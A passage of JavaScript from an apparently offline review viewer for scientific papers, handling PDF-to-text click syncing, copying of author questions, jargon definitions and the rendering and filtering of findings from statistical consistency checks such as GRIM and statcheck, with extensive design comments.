      if(!got.span){
        if(hits) hits.textContent=(got.reason==='no confident match')
          ? 'no confident match in the source document for that line' : got.reason;
        return false;
      }
      pdfPane.querySelectorAll('.srchit').forEach(x=>x.classList.remove('srchit'));
      got.span.el.classList.add('srchit');
      got.span.el.scrollIntoView({block:'center'});
      if(hits) hits.textContent='source document moved to that passage';
      return true;
    }
    if(!P.length) return false;
    const spans=[];
    for(const pg of docPages())
      for(let i=0;i<pg.lines.length;i++)
        spans.push({t:pg.lines[i].t, p:pg.page, i:i});
    const got=_bestSpan(probeText, spans);
    if(!got.span){
      if(hits) hits.textContent=(got.reason==='no confident match')
        ? 'no confident match in the PDF for that line' : got.reason;
      return false;
    }
    pdfPane.querySelectorAll('.ln.hit').forEach(x=>x.classList.remove('hit'));
    const target=pdfPane.querySelector(
      '.ln[data-doc="'+curDoc+'"][data-p="'+got.span.p+'"][data-i="'+got.span.i+'"]');
    if(target){ target.classList.add('hit');
      target.scrollIntoView({block:'center'});
      if(hits) hits.textContent='PDF moved to p.'+got.span.p; }
    return true;
  }

  /* ---- SOURCE -> text. Click a passage in the source, find it in the
     extraction. Works off the same probe whether the passage came from a PDF
     line box or from an element of a rendered HTML/EPUB/office document; an
     image has neither and says so rather than doing nothing. ---- */
  function locateInExtraction(probeSeed){
    let probe = String(probeSeed||'').trim().split(/\s+/).slice(0,6).join(' ');
    if(q){ q.value = probe; }
    let n = highlightText(probe, false);
    if(!n && probe.split(' ').length>3){
      probe = probe.split(' ').slice(0,3).join(' ');
      if(q) q.value = probe;
      n = highlightText(probe, false);
    }
    previews(probe);
    if(chosenView==='rendered' && rendered && !flashBlockAt(firstHitOffset())){
      setView('raw', false);
    }
    const mark = pre && pre.querySelector('mark.hit');
    if(mark && !pre.hidden) mark.scrollIntoView({block:'center'});
    if(!n && hits) hits.textContent =
      'that passage is not in the extracted text -- which is itself worth '
      +'knowing: it means the checks never saw it';
  }

  /* A non-PDF source document: any block the reader clicks becomes the probe. */
  if(pdfPane){
    pdfPane.addEventListener('click', ev=>{
      if(docById(curDoc).locate!=='dom') return;
      const el = ev.target.closest(
        '.docbody p,.docbody li,.docbody tr,.docbody h1,.docbody h2,.docbody h3,'
        +'.docbody h4,.docbody h5,.docbody h6,.docbody pre,.docbody blockquote,'
        +'.docbody caption,.docbody dd,.docbody dt');
      if(!el) return;
      pdfPane.querySelectorAll('.srchit').forEach(x=>x.classList.remove('srchit'));
      el.classList.add('srchit');
      locateInExtraction(probeAround(el.textContent||'',
                                     caretOffsetIn(el, ev)));
    });
  }

  if(pdfPane && P.length){
    pdfPane.addEventListener('click', ev=>{
      const el = ev.target.closest('.ln'); if(!el) return;
      const pg = P.find(x=>String(x.page)===el.dataset.p
                        && String(x.doc||0)===String(el.dataset.doc||0));
      if(!pg) return;
      const line = pg.lines[+el.dataset.i]; if(!line) return;
      pdfPane.querySelectorAll('.ln.hit').forEach(x=>x.classList.remove('hit'));
      el.classList.add('hit');
      /* Six words: a full line often breaks mid-sentence across columns, and
         the markdown re-flows it, so a whole-line match usually fails.
         `locateInExtraction` also lands the reader in the pane they are already
         looking at -- this used to force the raw pane on every click, so with
         `rendered` as the default, clicking the PDF threw the reader into a
         wall of pipe characters every time. */
      locateInExtraction(line.t);
    });
  }

  /* Where in the raw text the first search hit sits. `mark` elements are built
     from the raw string, so the text before the first one IS its offset. */
  function firstHitOffset(){
    if(!pre) return -1;
    const mark=pre.querySelector('mark.hit'); if(!mark) return -1;
    const r=document.createRange();
    r.setStart(pre,0); r.setEndBefore(mark);
    return r.toString().length;
  }

  /* Scroll the rendered block containing a raw-text offset, and flash it.
     This is what `data-src-offset` is for: the rendered DOM has no character
     offsets of its own, so each block carries the offset it began at. */
  function flashBlockAt(offset){
    if(offset<0 || !rendered) return false;
    const blocks=[...rendered.querySelectorAll('[data-src-offset]')];
    if(!blocks.length) return false;
    let found=null;
    for(const b of blocks){ if(+b.dataset.srcOffset<=offset) found=b; else break; }
    if(!found) return false;
    rendered.querySelectorAll('.blk.hit').forEach(x=>x.classList.remove('hit'));
    found.classList.add('hit');
    found.scrollIntoView({block:'center'});
    return true;
  }

  /* ---- text -> PDF. THE PROBE MUST BE THE WORDS YOU CLICKED ON. ----

     MEASURED on 10.1038/s41537-025-00576-3, replaying the old handlers against
     the real payload at four click positions in each of four paragraphs:

       RAW pane      1 distinct probe out of 4 click points, every paragraph.
       RENDERED pane the probe was the WHOLE paragraph, and the PDF landed on
                     an arbitrary line inside it -- a 1706-character abstract
                     beginning "Cardiovascular diseases (CVDs) are the leading
                     cause..." jumped to line 16, "based on their dominant
                     characteristics: low-risk CVDs (47.8...".

     Both were the same mistake made twice. Markdown puts a whole paragraph on
     ONE line, so the raw pane's `lastIndexOf('\n')`-to-`indexOf('\n')` window
     spans the paragraph however you click inside it; the rendered pane handed
     over `el.textContent`, which is the paragraph by definition. Neither used
     the click position it had in hand. Greg's report -- "only highlights if it
     is in a different paragraph", "snaps to seemingly a random line from the
     paragraph" -- is exactly these two behaviours.

     Note the old scoring reported `frac 1` on every one of those wrong jumps:
     `frac` is the share of the PDF LINE the probe covers, and a paragraph
     covers any short line completely. The confidence gate could not fire,
     because a long probe is always "confident". Localising the probe is what
     puts teeth back into the gate, not a change to the threshold.

     DELEGATED FROM THE PANE, not bound to the elements. `pre` and `rendered`
     are rebound every time the reader switches document, so a listener attached
     to the paper's <pre> at construction time would keep firing for the paper
     and never for the supplement the reader is actually looking at -- and,
     worse, would go on scoring against the paper's PDF. One listener on the
     container survives every switch. */
  const txtPane=document.getElementById('pane-txt');
  if(txtPane){
    txtPane.style.cursor='pointer';
    txtPane.addEventListener('click', ev=>{
      if(!pre && !rendered) return;
      if(pre && !pre.hidden && pre.contains(ev.target)){
        const sel=document.getSelection();
        if(!sel||!sel.focusNode||!pre.contains(sel.focusNode)) return;
        const r=document.createRange();
        r.setStart(pre,0);
        try{ r.setEnd(sel.focusNode, sel.focusOffset); }catch(e){ return; }
        jumpToPdf(probeAround(rawText, r.toString().length));
        return;
      }
      if(rendered && !rendered.hidden && rendered.contains(ev.target)){
        const el = ev.target.closest('p,li,tr,h1,h2,h3,h4,h5,h6,pre,blockquote,caption')
                || ev.target.closest('[data-src-offset]');
        if(!el || !rendered.contains(el)) return;
        rendered.querySelectorAll('.blk.hit').forEach(x=>x.classList.remove('hit'));
        const blk = el.closest('[data-src-offset]');
        if(blk) blk.classList.add('hit');
        jumpToPdf(probeAround(el.textContent||'', caretOffsetIn(el, ev)));
      }
    });
  }

  // The header labels, the sync note and the initial pane visibility.
  selectDoc(0);

  /* `applyJump()` used to be called HERE, at the end of `after()`. That runs
     during construction, before `show()` adds the `on` class -- so the pane was
     still `display:none`, `scrollIntoView` did nothing, and `applyJump` had
     already nulled `window.__jump`, which meant the correctly-timed call in
     `show()` found nothing left to do. Measured: pane scrollTop stayed 0 for a
     jump to page 5 whose element sits at offsetTop 3389. The call now lives in
     `show()` alone, after the section is visible.
     ---- (deliberately no applyJump() here) ---- */
}});

/* Same normalisation the build-time anchoring used, so offsets line up. */
function _norm(s){ return String(s||'').replace(/\s+/g,' ').trim().toLowerCase(); }

/* How much text a click hands to the PDF matcher, in characters.
   A typeset PDF line is roughly 60-70 characters, and the matcher scores by
   how much of a LINE the probe covers -- so the probe must reliably CONTAIN a
   whole line, or nothing scores. 130 spans about two lines: wide enough that
   one is always covered whatever the click position, narrow enough that the
   window stays where the reader pointed. Widening it to a paragraph is what
   the two bugs above were. */
const PROBE_SPAN = 130;

/* A window of `text` centred on `index`, snapped outward to word boundaries so
   the probe never starts or ends mid-word -- a half-word is a token that
   matches nothing and dilutes the score. Falls back to the whole string when
   the caret is unknown, which is the old behaviour and no worse than it. */
function probeAround(text, index){
  const s=String(text||'');
  if(!(index>=0) || s.length<=PROBE_SPAN) return s;
  let a=Math.max(0, index-Math.floor(PROBE_SPAN/2));
  let b=Math.min(s.length, a+PROBE_SPAN);
  a=Math.max(0, b-PROBE_SPAN);
  if(a>0){ const sp=s.indexOf(' ', a); if(sp>=0 && sp<a+30) a=sp+1; }
  if(b<s.length){ const sp=s.lastIndexOf(' ', b); if(sp>a+30) b=sp; }
  return s.slice(a,b);
}

/* Character offset of the click WITHIN `el`'s text.
   `caretRangeFromPoint` is Chrome/Safari, `caretPositionFromPoint` is the
   standard Firefox implements; a browser with neither returns -1 and
   `probeAround` degrades to the whole element. Measuring the offset by
   range-to-string rather than by summing node lengths keeps it consistent with
   `el.textContent`, which is what the probe is sliced from. */
function caretOffsetIn(el, ev){
  try{
    let node=null, off=0;
    if(document.caretRangeFromPoint){
      const cr=document.caretRangeFromPoint(ev.clientX, ev.clientY);
      if(cr){ node=cr.startContainer; off=cr.startOffset; }
    }else if(document.caretPositionFromPoint){
      const cp=document.caretPositionFromPoint(ev.clientX, ev.clientY);
      if(cp){ node=cp.offsetNode; off=cp.offset; }
    }
    if(!node || !el.contains(node)) return -1;
    const r=document.createRange();
    r.setStart(el,0); r.setEnd(node,off);
    return r.toString().length;
  }catch(e){ return -1; }
}

/* Whether the crop actually caught the figure. The extractor computes this and
   the tool description tells the MODEL to read it before quoting a value off an
   image -- but no human-facing surface showed it, so a whole-page render and a
   real crop looked identical in the strip. */
const CROP_NOTE={
  high:'',
  partial:'the figure appears to continue past the crop -- part of it was walled '
    +'off by a paragraph or a caption, so treat this as an incomplete view',
  low:'the crop holds too little ink to be a chart -- probably a header sliver',
  none:'NOT A CROP: this is the whole page, because no artwork was found near the caption',
  unknown:'confidence unrecorded: this record was rebuilt from the filename, '
    +'because the extractor wrote none',
};
function cropTag(c){
  const k=String(c||'unknown');
  if(k==='high') return '';
  const note=CROP_NOTE[k]||CROP_NOTE.unknown;
  return `<span class="mark ${k==='none'?'no':'unknown'}" title="${esc(note)}">${
    esc(k)} confidence</span> <span class="muted">${esc(note)}</span>`;
}

S.push({id:'report', label:'Report', build(){
  const cite=(D.paper_facts||[]).reduce((o,f)=>(o[f.fact]=f.value,o),{});
  return `<h2>${esc(shortCite())}</h2>
    <p class="muted">${esc(cite['Title']||'')}</p>
    <details><summary>Paper metadata</summary>${
      kv((D.paper_facts||[]).map(f=>[esc(f.fact),esc(f.value)]))}</details>
    <div class="report">${defineJargon(linkRefs(D.report_html||'<p class="muted">No report.</p>'))}</div>
    <h3>What was not available to this review</h3>
    <p class="muted">Not faults of the paper. These are the things a complete
      analysis would have had and this one did not.</p>
    ${kv((D.practice||[]).filter(p=>p.status==='no'||p.status==='unknown')
      .map(p=>[esc(p.practice),esc(p.detail)]))}`;
}});

/* THE ONLY ACTIONABLE PART OF THE DOCUMENT, and it was a sub-heading two
   thirds of the way down the Report page, below a wall of prose. It is now a
   section of its own with its own place in the contents: a reader who wants to
   do something about this paper should not have to scroll to find out what.
   The corresponding author's address sits beside it because a question you
   cannot send is not actionable. */
S.push({id:'questions', label:'Questions for the authors',
  count:()=>((D.report_obj||{}).questions_for_authors||[]).length, build(){
  const Q=(D.report_obj||{}).questions_for_authors||[];
  const g=f=>((D.paper_facts||[]).find(x=>x.fact===f)||{}).value||'';
  const to=g('Corresponding author');
  if(!Q.length) return `<h2>Questions for the authors</h2>
    <p class="muted">This review produced none. That is not the same as having
      nothing to ask -- it means the editorial stage did not write any.</p>`;
  return `<h2>Questions for the authors</h2>
    <p class="muted">Each is answerable from what the authors already have.
      None presupposes an error on their part: an inconsistency is far more
      often a reporting slip, or a mistake by this tool in reading a number off
      the page, than anything else.</p>
    ${to && to.indexOf('not ')!==0
      ? `${kv([['Send to', esc(to)]])}`
      : `<p class="muted">No corresponding author was extracted, so these have
           nowhere to go without looking one up.</p>`}
    ${/* The questions are written to be SENT. What goes in the message is the
          questions; "Would resolve" is our note to ourselves about why each is
          worth asking, and pasting it to an author reads as us explaining our
          own suspicions to them. So the copy takes the questions alone. */''}
    ${/* The label and the note beside it used to read as ONE sentence on the
          page -- "Copy the 5 questions questions only, without the Would
          resolve notes" -- because each was written without the other in
          view. */''}
    <p><button type="button" class="copyq" onclick="copyQuestions(this)">Copy the
      ${Q.length} question${Q.length===1?'':'s'}</button>
      <span class="muted">(the <i>Would resolve</i> notes are ours, and are not
        copied)</span></p>
    <textarea id="qtext" class="offscreen" readonly>${esc(
      Q.map((q,i)=>`${i+1}. ${q.question}`).join('\n\n'))}</textarea>
    <ol class="qlist">${Q.map(q=>`<li>${esc(q.question)}${
      q.why?`<br><span class="muted">Would resolve: ${esc(q.why)}</span>`:''}</li>`).join('')}</ol>`;
}});

/* Copy on a `file://` page.
   `navigator.clipboard` requires a SECURE CONTEXT, and `file://` is not one in
   Chrome -- the object is simply undefined there. A button wired only to it
   would do nothing at all, silently, in the one way this bundle is actually
   opened. `execCommand('copy')` is deprecated and works, which makes it the
   right call for an offline document; the modern API is tried first for the
   case where someone serves the bundle over HTTP.

   The textarea is a real element on the page rather than one created on the
   fly, so if BOTH paths fail the last resort is to select its contents and
   leave the reader one Ctrl+C away instead of empty-handed. */
function copyQuestions(btn){
  const ta=document.getElementById('qtext'); if(!ta) return;
  const done=ok=>{
    const was=btn.textContent;
    btn.textContent = ok ? 'Copied' : 'Press Ctrl+C';
    setTimeout(()=>{btn.textContent=was;}, 1800);
  };
  /* try/catch AROUND the call, not only a rejection handler on the promise.
     MEASURED in Chrome while testing this: `writeText` fails with
     "NotAllowedError: Document is not focused" whenever the window is not the
     OS foreground window, and a throw from the call itself would escape this
     handler entirely -- leaving a button that does nothing and says nothing,
     which is the failure this repo keeps finding in other forms. */
  if(navigator.clipboard && window.isSecureContext){
    try{
      navigator.clipboard.writeText(ta.value)
        .then(()=>done(true), ()=>done(legacyCopy(ta)));
      return;
    }catch(e){ /* fall through to the offline path */ }
  }
  done(legacyCopy(ta));
}
function legacyCopy(ta){
  ta.classList.remove('offscreen');
  ta.select();
  ta.setSelectionRange(0, ta.value.length);
  let ok=false;
  try{ ok=document.execCommand('copy'); }catch(e){ ok=false; }
  /* Left VISIBLE and selected when the copy failed, hidden again when it
     worked. A failure that hides the text has taken the fallback away too. */
  if(ok) ta.classList.add('offscreen');
  return ok;
}

/* "Romano et al. 2025" -- how a person refers to a paper, as against the DOI
   slug, which is how the filesystem does. */
function shortCite(){
  const g=f=>((D.paper_facts||[]).find(x=>x.fact===f)||{}).value||'';
  const authors=g('Authors'), year=g('Year');
  if(!authors||authors.indexOf('not ')===0) return D.paper_title||D.paper_id||'Report';
  const people=authors.split(',').map(s=>s.trim())
    .filter(s=>s && !/^(?:[A-Z]\.?\s*){1,4}$/.test(s));
  const surname=(people[0]||'').split(/\s+/).pop();
  if(!surname) return D.paper_title||D.paper_id||'Report';
  return surname+(people.length>1?' et al.':'')+(year&&year.indexOf('not ')!==0?' '+year:'');
}

/* Every "Table 2" or "Figure 1" in the report becomes a link into the paper.
   Anchoring is by the page the anatomy or the figure records give for that
   label; where neither knows one, the text is left alone rather than made into
   a link that goes nowhere. */
function linkRefs(html){
  const pages={};
  (D.figure_records||[]).forEach(f=>{
    if(f.label&&f.page) pages[String(f.label).toLowerCase()]=f.page;});
  (D.findings||[]).forEach(f=>{
    const a=f._anchor, loc=String(f.location||'').match(/\b(table|figure|fig\.?)\s*(\d+)/i);
    if(a&&a.page&&loc) pages[(loc[1].toLowerCase().replace(/^fig\.?$/,'figure'))
      +' '+loc[2]]=a.page;});
  if(!Object.keys(pages).length) return html;
  // Skip anything already inside a tag or an existing anchor.
  return html.replace(/(>[^<]*)\b((?:Table|Figure|Fig\.?)\s*(\d+))\b/g,
    (m,pre,label,num)=>{
      const key=(label.toLowerCase().startsWith('t')?'table ':'figure ')+num;
      const pg=pages[key];
      return pg?`${pre}<a href="#" onclick="goSource(${pg},null);return false">${label}</a>`:m;
    });
}

/* Named jargon defined at point of use, the same way linkRefs turns
   "Table 2" into a link: a replace over TEXT NODES ONLY -- the (>[^<]*?)
   guard cannot match inside a tag or an attribute -- applied to the
   already-rendered report HTML. Definitions come from D.glossary, the same
   entries the How-to-read-this page renders, so there is one wording; a
   term with no glossary entry in this payload is left alone rather than
   given an invented definition. The non-greedy prefix makes it the FIRST
   occurrence in each text node, like a journal defining on first use. */
const JARGON=[
  {re:'Benjamini[-\u2013\u2014 ]?Hochberg|\\bBH\\b', term:'Benjamini-Hochberg (BH)'},
  {re:'\\bBonferroni\\b', term:'Bonferroni correction'},
  {re:'\\bfamil(?:y[ -]|y)wise(?: error rate)?|\\bFWER\\b', term:'Family-wise error rate'},
  {re:'\\btau[-_ ]?hat\\b|\u03c4\u0302', term:'Tau-hat'},
];
function defineJargon(html){
  let out=String(html||'');
  for(const j of JARGON){
    const g=(D.glossary||[]).find(x=>x.term===j.term);
    if(!g||!g.plain) continue;
    const t=esc(g.term+': '+g.plain);
    out=out.replace(new RegExp('(>[^<]*?)('+j.re+')','g'),
      (m,pre,word)=>pre+'<span class="def" title="'+t+'" data-cb="terms">'+word+'</span>');
  }
  return out;
}

/* THE FINDINGS-V2 PAGE. A parallel-era run (v1.0.0+) has one finding
   universe, already adjudicated: each row carries its FINAL 1-9 severity,
   the adjudicator's action and rationale, and the paper-level verdict sits
   in D.adjudication. None of the legacy machinery below (editorial cards
   over nested sweep evidence, stage1_finding_ids joins, the 5-enum
   dropdown) describes it, so it renders natively rather than wearing the
   old vocabulary -- an S5 is not "impossible", and pretending so would put
   this system's strongest word on findings that never earned it. */
function v2FindingsPage(){
  const adj=D.adjudication||{};
  const rows=D.findings||[];
  const isDead=f=>f.adjudication_action==='discarded'||f.adjudication_action==='merged';
  const live=rows.filter(f=>!isDead(f)), dead=rows.filter(isDead);
  const chip=f=>{
    if(!f.severity_9) return '';
    const c=(f.severity_colors||{}).light||'#556';
    const t=esc((f.severity_label||'')+' -- final 1-9 severity, assigned by the adjudicator');
    return '<span class="def" title="'+t+'" style="background:'+c+';color:#fff;border-radius:3px;padding:0 6px;font-weight:600">S'+f.severity_9+'</span>';
  };
  const hid=adj.headline_finding_id;
  const ordered=[...live.filter(f=>f.id===hid), ...live.filter(f=>f.id!==hid)];
  const card=(f,i)=>{
    const a=f.adjudication||{};
    return '<div id="f'+(i+1)+'" style="margin:12px 0;padding:10px 12px;border:1px solid var(--rule,#ccc);border-radius:4px">'
      +'<div>'+chip(f)+' <b>'+esc(f.title||f.slug||'(untitled)')+'</b>'
      +(f.id===hid?' <span class="muted">&mdash; the headline finding</span>':'')+'</div>'
      +'<div class="muted" style="font-size:12px;margin:2px 0">'+esc(DN(f.producer||''))
      +(f.technique?' &middot; '+esc(f.technique):'')
      +(f.location?' &middot; '+esc(f.location):'')
      +(f.outcome&&f.outcome!=='problem'?' &middot; outcome: '+esc(f.outcome):'')
      +(f.adjudication_action&&f.adjudication_action!=='kept'?' &middot; adjudicator: '+esc(f.adjudication_action):'')
      +(f.quote_verified?' &middot; quote '+esc(f.quote_verified):'')+'</div>'
      +(f.description?'<p style="margin:6px 0">'+esc(f.description)+'</p>':'')
      +(f.quote?'<blockquote style="margin:6px 0;padding-left:10px;border-left:3px solid var(--rule,#ccc)"><code>'+esc(f.quote)+'</code></blockquote>':'')
      +anchorLinks(f)
      +(a.rationale?'<p class="muted" style="font-size:12px;margin:6px 0 0"><b>adjudicator:</b> '+esc(a.rationale)+'</p>':'')
      +'</div>';
  };
  const head=adj.verdict
    ? '<p><b>'+esc(String(adj.verdict).replace(/_/g,' '))+'</b>'
      +(adj.paper_severity?' &middot; paper severity S'+esc(String(adj.paper_severity)):'')
      +(adj.confidence?' <span class="muted">('+esc(String(adj.confidence))+' confidence)</span>':'')+'</p>'
      +(adj.summary?'<p class="muted">'+esc(adj.summary)+'</p>':'')
    : '<p class="muted">No adjudication block was recorded for this run; severities below are the document’s own.</p>';
  const deadHtml=dead.length
    ? '<h3>Set aside by the adjudicator ('+dead.length+')</h3>'
      +'<p class="muted">Discarded or merged rows are RETAINED on the record with the reason, never deleted.</p>'
      +dead.map((f,i)=>card(f,ordered.length+i)).join('')
    : '';
  return '<h2>Findings</h2>'+head
    +'<p class="muted">'+ordered.length+' finding(s); severities are the final 1&ndash;9 ladder levels the adjudicator assigned. The document of record is <code>analysis/findings.v2.json</code>.</p>'
    +ordered.map(card).join('')+deadHtml;
}

S.push({id:'findings', label:'Findings', count(){
  const ed=(D.report_obj||{}).findings||[];
  return ed.length || (D.findings||[]).length;
}, countTitle(){
  if(D.findings_format==='v2')
    return (D.findings||[]).length+' adjudicated findings (1-9 ladder)';
  const ed=(D.report_obj||{}).findings||[];
  /* "tool verdicts" is the OTHER universe -- one per check that returned,
     passes included -- and `D.findings` is the sweep's FINDINGS. Same mislabel
     the Overview carried; corrected here so the tooltip and the page agree. */
  return ed.length
    ? ed.length+' findings in the report (the sweep recorded '+(D.findings||[]).length+' findings; see Overview)'
    : (D.findings||[]).length+' sweep findings (no editorial findings)';
}, build(){
  if(D.findings_format==='v2') return v2FindingsPage();
  /* The ladder is injected from tools/severity.py at build time, not written
     out again here. It already existed in five places; a sixth copy that the
     tests do not reach would drift silently. */
  const order=__SEVERITY_ORDER__;
  const bySev=(a,b)=>((order[a.severity]??9)-(order[b.severity]??9)) || (cRank(a)-cRank(b));
  const sweep=[...(D.findings||[])].sort(bySev);
  const ed=[...((D.report_obj||{}).findings||[])];
  if(!sweep.length && !ed.length) return '<h2>Findings</h2><p class="muted">No findings.</p>';

  /* EDITORIAL FINDINGS ARE THE PAGE; the sweep findings are evidence nested
     under them. A reader asking "does this paper have problems?" needs the
     triaged, titled, ranked list -- the raw checks are what it rests on, not
     the headline. This page used to show only the sweep, so the titled
     findings the editorial stage actually wrote were never displayed
     anywhere, and the reader met 23 tool verdicts instead of 9 conclusions.

     Nothing is lost: every sweep finding is reachable, either nested under the
     finding that cites it or in the "not carried into the report" group below,
     and `findings.json` is in the file tree regardless. */
  const byId={}; sweep.forEach(f=>{ if(f.id) byId[f.id]=f; });
  const cited=new Set();
  ed.forEach(e=>(e.stage1_finding_ids||[]).forEach(i=>cited.add(String(i))));
  const orphans=sweep.filter(f=>!cited.has(String(f.id)));

  /* THE DROPDOWN LISTS WHAT IS ON THE PAGE. It was built from `sweep`, and the
     cards rendered at top level are the EDITORIAL findings plus the orphans --
     a nested sweep finding carries its own severity but its parent card does
     not inherit it (`data-sev` comes from the editorial finding). So an
     `impossible` tool verdict that the editorial stage triaged down to
     `suspicious` still put "impossible" in a dropdown, where it reads as the
     strongest claim this system can make about the paper -- and selecting it
     hid every card, because no rendered card carries that severity. The one
     word the reader must never see without a finding behind it was offered by
     a control that could not show them one.

     Techniques are still taken from the sweep, and that is correct rather than
     inconsistent: every sweep finding is either nested under a card -- whose
     `data-tech` is built from its backing techniques -- or rendered as an
     orphan with its own, so every option here reaches at least one card. */
  const shown = ed.length ? ed.concat(orphans) : sweep;
  const sevs=[...new Set(shown.map(f=>f.severity))].filter(Boolean)
    .sort((a,b)=>(order[a]??9)-(order[b]??9));
  const techs=[...new Set(sweep.map(f=>f.technique))].filter(Boolean).sort();
  const filters=`<div style="margin:8px 0">
      <input type="search" id="fq" placeholder="filter findings..." size="30">
      <select id="fsev"><option value="">any severity</option>${sevs.map(s=>`<option>${esc(s)}</option>`).join('')}</select>
      <select id="ftech"><option value="">any technique</option>${techs.map(s=>`<option>${esc(s)}</option>`).join('')}</select>
      <span class="muted" id="fcount"></span>
    </div>`;

  /* HOW MUCH OF THIS PAGE CAN A READER TRACE BACK TO THE PAGE OF THE PAPER?
     Counted from the sweep findings being rendered, not from run_meta, so the
     number cannot disagree with what the reader is looking at. `technique:
     manual` is excluded: the model read those off the paper itself, there is
     no producing call to quote, and counting them as untraceable would report
     a design fact as a coverage failure. */
  /* ONE SENTENCE, COMPUTED ONCE (`viewer_facts.traceability_sentence`), shared
     with the Overview. The two used to be computed separately from the same
     array with slightly different filters, which is how the document ended up
     answering one apparent question with three different numbers on three
     pages. It also said "cite values this bundle cannot trace back to the page"
     about findings that DO quote the paper -- see the note at the Overview
     site. Both halves are now stated: what is traceable, and what the narrower
     join could not tie to a specific call. */
  const srcLine=((D.facts||{}).traceability_sentence)
    ? `<p class="muted">${esc(D.facts.traceability_sentence)}</p>` : '';

  /* THE INDEX. Twelve findings, each roughly one screen, no collapse and no
     way to triage: a reader had to scroll the whole page to learn whether
     anything here touches a conclusion they must act on.

     WHAT KEEPS THIS FROM BEING A DASHBOARD -- the risk is real and the rules
     are in `viewer_facts.finding_index`: no totals row, no aggregate anywhere,
     severity is a sort key and a chip rather than a headline, every cell is a
     property of ONE finding that a reader can go and check. The `changes`
     column carries "(asserted)" wherever the pipeline did not compute the
     consequence, so the one subjective column cannot borrow the authority of
     the objective ones beside it. */
  const idx=((D.facts||{}).index)||[];
  const EVWORD={computed:'a validated check', hand_computed:'the model itself',
                reading:'a reading of the paper'};
  const idxHtml=idx.length?`<h3>The findings at a glance</h3>
    <p class="muted">Sorted by severity. Every column is a property of one
      finding, not a score, and there is deliberately no total: this is a list
      of questions, and adding them up would make it a grade.</p>
    ${tbl(['','finding','what it changes','computed by','re-runs','where'],
      idx.map(r=>[
        sev(r.severity),
        `<a href="#f${r.n}">${esc(r.title)}</a>`,
        esc(r.changes)+(r.changes_computed?'':' <span class="muted">(asserted)</span>'),
        `<span class="muted">${esc(EVWORD[r.evidence]||r.evidence||'-')}</span>`,
        r.reproduces?'yes':'<span class="muted">no</span>',
        `<span class="muted">${esc(r.location||'-')}</span>`]))}`:'';

  if(!ed.length){
    return `<h2>Findings</h2>
      <p class="muted">The editorial stage produced no findings for this run,
        so what follows is the raw sweep. Most severe first. Terms are defined
        in the <a href="#about">codebook</a>.</p>
      ${srcLine}
    ${idxHtml}
      ${filters}<div id="flist">${sweep.map(fHtml).join('')}</div>`;
  }
  return `<h2>Findings</h2>
    <p class="muted">The review's own findings, ordered by severity and then by
      what each one changes. Under each, the tool verdicts it rests on -- open
      one to see the arithmetic. Terms are defined in the
      <a href="#about">codebook</a>.</p>
    ${srcLine}
    ${filters}
    <div id="flist">${ed.map((e,i)=>edHtml(e,i,byId)).join('')}</div>
    ${orphans.length?`<h3>Checks the report did not carry (${orphans.length})</h3>
      <p class="muted">These ran and returned a verdict, and the editorial stage
        did not build a finding on them. Most are <i>consistent</i> -- a check
        that passed. They are here because "ran and found nothing" is a
        different fact from "never ran", and neither should be invisible.</p>
      <div id="orphans">${orphans.map(fHtml).join('')}</div>`:''}`;
}, after(){
  /* KEYED ON THE SAME CONDITION THE BUILDER USES. `build()` early-returns
     `v2FindingsPage()` for a v2 run and renders no filter bar, so this wiring
     has nothing to attach to -- it is v1 markup only. Reading the same flag
     rather than probing for one of the elements keeps the two halves of this
     section from drifting apart again, which is how they got here. */
  if(D.findings_format==='v2') return;
  const q=document.getElementById('fq'), s=document.getElementById('fsev'),
        t=document.getElementById('ftech'), c=document.getElementById('fcount');
  if(!q||!s||!t||!c) return;
  /* Filter what the reader can SEE. `data-hay` was `JSON.stringify(finding)`,
     which searches the payload instead: `granularity` HID the card headed
     "Granularity of a standard deviation (GRIMMER)" -- because that heading is
     synthesised at render time and appears nowhere in the JSON -- while
     `stage1_finding_ids` matched 10 cards and `true` matched all 18. Taking
     the rendered text also folds nested evidence into its parent's haystack
     for free, since the evidence lives inside the card. */
  document.querySelectorAll('#flist > .finding, #orphans > .finding').forEach(el=>{
    el.dataset.hay = (el.textContent||'').replace(/\s+/g,' ').toLowerCase();
  });
  const run=()=>{
    let n=0, nEd=0, nOrph=0;
    /* Top-level cards only. A nested sweep finding is EVIDENCE for the card
       above it, so hiding one on a technique filter would leave a finding
       claiming support it appears not to have. Its text is folded into the
       parent's haystack instead, so filtering by `grim` still surfaces the
       editorial finding that rests on a GRIM check. */
    document.querySelectorAll('#flist > .finding, #orphans > .finding').forEach(el=>{
      const ok = (!q.value || el.dataset.hay.includes(q.value.toLowerCase()))
        && (!s.value || el.dataset.sev===s.value)
        && (!t.value || (el.dataset.tech||'').split(' ').includes(t.value));
      el.style.display = ok?'':'none';
      if(ok){ n++; if(el.parentElement && el.parentElement.id==='orphans') nOrph++; else nEd++; }
    });
    /* EACH HALF UNDER ITS OWN NAME. This read "18 shown" while the contents
       badge beside it read 10, and both were right: 10 findings the report
       wrote, plus 8 checks it did not carry, rendered on one page. A reader
       who counts cards and compares gets a contradiction with nothing on
       screen to resolve it, and the obvious inference is that one of our
       counts is broken. The page now says which number is which -- the same
       fix the Overview already got for the same collision. */
    c.textContent = nOrph
      ? n+' shown -- '+nEd+' from the report, '+nOrph+' check'+(nOrph===1?'':'s')+' it did not carry'
      : n+' shown';
  };
  [q,s,t].forEach(e=>e && e.addEventListener('input',run)); run();
}});

/* What each check is, in words a reader who is not a metascientist can use.
   Sweep findings carry no `title` -- the field exists only on the editorial
   stage's findings -- so the heading here is synthesised. It used to be the
   first sentence of `problems` or of `notes`, which produced headings like
   "Three independent tool calls" and "Run as a single check_table call which
   dispatched five distinct tools", i.e. methodology asides standing in for a
   statement of what was found. A title built from the STRUCTURE cannot do
   that: it says which check ran, on what, and how it came out. */
const CHECK_NAMES={
  grim:'Granularity of a mean (GRIM)',
  grim_percentage:'Granularity of a percentage (GRIM)',
  grim_sweep:'Granularity across several percentages (GRIM)',
  grimmer:'Granularity of a standard deviation (GRIMMER)',
  grimu:'Granularity of a rank-sum p-value (GRIM-U)',
  grimu_coexistence:'Coexistence of reported rank-sum results (GRIM-U)',
  debit:'Granularity of a binary mean (DEBIT)',
  sprite:'Plausibility of the underlying sample (SPRITE)',
  csf:'Baseline similarity across arms (Carlisle-Stouffer-Fisher)',
  stalt:'Exact p-value recovered from a threshold',
  statcheck:'p-value against its own test statistic (statcheck)',
  check_regression:'Coefficient against its standard error',
  check_summation:'Whether a column adds up',
  check_sd_range:'Standard deviation against the scale range',
  check_sd_or_se:'Whether a dispersion is an SD or an SE',
